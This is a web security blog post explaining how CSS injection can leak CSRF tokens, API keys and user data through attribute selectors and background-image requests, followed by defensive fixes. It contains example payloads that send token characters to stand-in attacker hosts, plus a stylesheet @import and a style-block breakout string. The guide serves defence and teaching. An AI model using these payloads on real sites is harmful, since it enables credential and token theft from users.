---
title: "CSS Injection: Your Stylesheet Is a Spy 🎨🕵️"
date: "2026-04-14"
excerpt: "You blocked JavaScript with a strict CSP, hardened your API, and patched every XSS. Then an attacker injected 3 lines of CSS and exfiltrated your CSRF tokens anyway. Here's how CSS steals secrets — and how to stop it."
tags: ["security", "cybersecurity", "css", "web-security", "frontend"]
featured: true
---

# CSS Injection: Your Stylesheet Is a Spy 🎨🕵️

You spent a week locking down your app. Strict `Content-Security-Policy`, sanitized inputs, no `eval()` anywhere. You even blocked inline scripts. You felt safe.

Then a security researcher submitted a bug bounty report: **"CSS injection leads to CSRF token exfiltration."**

You stared at the screen. CSS? *Stylesheets?* Those are harmless, right?

Wrong. Dead wrong. Let me show you how CSS can steal secrets without a single line of JavaScript. 😬

## Wait, CSS Can Steal Data? 🤨

Yes. And it's been abused in the wild for years.

Here's the core trick — CSS **attribute selectors** combined with **background-image requests**:

```css
/* If the CSRF token starts with "a"... */
input[name="csrf_token"][value^="a"] {
  background: url("https://attacker.com/leak?c=a");
}

/* If the CSRF token starts with "b"... */
input[name="csrf_token"][value^="b"] {
  background: url("https://attacker.com/leak?c=b");
}
```

The browser evaluates those selectors. When one matches — say, the token starts with `a` — it fires an HTTP request to the attacker's server to fetch the "background image." The attacker sees the request. Now they know the first character.

Repeat for every character. Automate it. You've exfiltrated the entire token. **Without JavaScript. Without XSS. Just CSS.** 🎯

## How Does CSS Injection Happen? 💉

Three common entry points:

**1. User-controlled styles in a `<style>` tag**

```html
<!-- App lets users customize their profile color -->
<style>
  .profile-header {
    background-color: {{ user_color }};  <!-- UNSANITIZED! -->
  }
</style>

<!-- Attacker sets color to: -->
<!-- red } input[value^="a"] { background: url(https://evil.com/?c=a) } .x { color: -->
```

**2. Partial CSS injection via `style` attribute**

```html
<!-- App reflects user input into inline style -->
<div style="color: {{ user_input }}">Hello</div>

<!-- Attacker injects: -->
<!-- red; background: url(https://evil.com/leak) -->
```

**3. Unsanitized `@import` or custom themes**

```css
/* App allows user-uploaded CSS themes */
@import url("https://attacker.com/evil.css");
/* Now attacker controls ALL styles on the page */
```

## The CSRF Token Heist: A Real Attack Flow 🏴‍☠️

Here's how an attacker actually does this step by step.

**The target:** A form with a hidden CSRF token:

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="x8kP2mQ9...">
  <input type="text" name="amount">
  <button>Transfer</button>
</form>
```

**The injected CSS** (automated, one request per possible character):

```css
/* Round 1: Figure out the first character */
input[name="csrf_token"][value^="0"] { background: url("https://evil.com/?pos=0&char=0"); }
input[name="csrf_token"][value^="1"] { background: url("https://evil.com/?pos=0&char=1"); }
/* ... one rule per character in the charset ... */
input[name="csrf_token"][value^="x"] { background: url("https://evil.com/?pos=0&char=x"); }
/* attacker.com receives: /?pos=0&char=x  → first char is 'x' */

/* Round 2: Figure out the second character */
input[name="csrf_token"][value^="x8"] { background: url("https://evil.com/?pos=1&char=8"); }
input[name="csrf_token"][value^="xA"] { background: url("https://evil.com/?pos=1&char=A"); }
/* attacker.com receives: /?pos=1&char=8  → second char is '8' */

/* Repeat until full token is reconstructed */
```

This works because:
- `[value^="x"]` means "starts with x" ✅
- `[value^="x8"]` means "starts with x8" ✅
- CSS fires HTTP requests to load "images" ✅
- No JavaScript involved ✅
- Your CSP blocking `script-src` does **nothing** ✅

Once the full token is known, the attacker can forge a request and bypass CSRF protection entirely.

## What Else Can CSS Leak? 🔍

The attribute selector technique works on any value in the DOM:

```css
/* Steal API keys from hidden inputs */
input[name="api_key"][value^="sk-"] {
  background: url("https://evil.com/?k=sk-");
}

/* Check if user is logged in as admin */
[data-role="admin"] {
  background: url("https://evil.com/youre-an-admin");
}

/* Exfiltrate username from data attributes */
[data-username^="john"] {
  background: url("https://evil.com/?u=john");
}

/* Detect installed browser extensions (yes, really) */
#extension-injected-element {
  background: url("https://evil.com/has-extension");
}
```

CSS injection can also enable **clickjacking**, **UI redressing**, and **information disclosure** (detecting app state) — all without a single `<script>` tag.

## How to Fix This 🛡️

### 1. Never Reflect User Input Into CSS Unsanitized

```javascript
// DANGEROUS: User input directly in CSS
app.get('/profile', (req, res) => {
  const color = req.query.color; // "red} evil{...}"
  res.send(`<style>.header { color: ${color}; }</style>`);
});

// SAFE: Validate against an allowlist
const ALLOWED_COLORS = /^#[0-9A-Fa-f]{6}$|^(red|blue|green|...)$/;

app.get('/profile', (req, res) => {
  const color = req.query.color;
  if (!ALLOWED_COLORS.test(color)) {
    return res.status(400).send('Invalid color');
  }
  res.send(`<style>.header { color: ${color}; }</style>`);
});
```

### 2. Lock Down CSS with a Tight Content-Security-Policy

```
Content-Security-Policy:
  default-src 'self';
  style-src 'self';           ← no 'unsafe-inline', no external stylesheets
  img-src 'self' data:;       ← block img requests to unknown domains
  connect-src 'self';
```

This alone doesn't prevent injection, but it **blocks the exfiltration** step — `url()` requests to attacker's domain get blocked by `img-src`.

### 3. Use a CSS Sanitizer for User-Supplied Styles

If you let users customize themes or embed styles, sanitize with a library:

```javascript
import { sanitize } from 'css-sanitizer'; // or similar library

const userCSS = req.body.theme_css;
const safeCSS = sanitize(userCSS, {
  allowedProperties: ['color', 'font-size', 'background-color'],
  allowedAtRules: [],          // no @import, no @font-face
  allowURLs: false,            // strip all url() values
});
```

No `url()` values → no exfiltration possible.

### 4. Move Sensitive Values Out of the DOM

The deeper fix: **don't put CSRF tokens in attribute values that CSS can read**.

```html
<!-- BAD: Token in value attribute — CSS can read it -->
<input type="hidden" name="csrf_token" value="x8kP2mQ9abc">

<!-- BETTER: Token set via JavaScript after page load -->
<input type="hidden" name="csrf_token" id="csrf">
<script>
  // Set via fetch, not rendered in HTML
  fetch('/api/csrf-token')
    .then(r => r.json())
    .then(({ token }) => document.getElementById('csrf').value = token);
</script>
```

If the token isn't in the HTML at page load time, CSS injection can't read it (assuming you've blocked `script-src 'unsafe-inline'` too).

## The Security Checklist 🗒️

- [ ] Never interpolate user input into `<style>` blocks or `style=` attributes
- [ ] Set a strict `Content-Security-Policy` with `style-src 'self'`
- [ ] Block `url()` in user-supplied CSS (use a sanitizer)
- [ ] Avoid storing secrets in visible DOM attributes
- [ ] Add CSS injection test cases to your security reviews
- [ ] Check for `@import` in any user-controllable CSS fields

## The Bottom Line 🎯

CSS injection is one of those vulnerabilities that sounds absurd until it destroys you. "Stylesheets can steal data" feels like a prank. But CSS attribute selectors + background-image requests is a legitimate, documented attack technique with real-world bug bounty payouts.

The hardest part isn't fixing it — a strict CSP and input validation handle most cases. The hard part is **remembering to check** for it when CSS is involved. Most security checklists stop at XSS and CSRF. CSS injection hides in the blind spot.

Secure your stylesheets like you secure your scripts. Your CSS is not "just styling" — in the right (wrong) conditions, it's a data exfiltration tool. 🔒

---

**Found a creative web vulnerability?** Let's connect on [LinkedIn](https://www.linkedin.com/in/anuraghkp) — security stories welcome.

**Curious how deep the rabbit hole goes?** Explore the projects on [GitHub](https://github.com/kpanuragh) — there's always more to learn.

*P.S. — If your app lets users upload custom CSS themes without sanitization, go fix that right now. I'll wait.* 😅

*P.P.S. — Yes, you can also use CSS injection to detect if someone is logged into other websites by targeting site-specific DOM elements. The web is wild.* 🌐
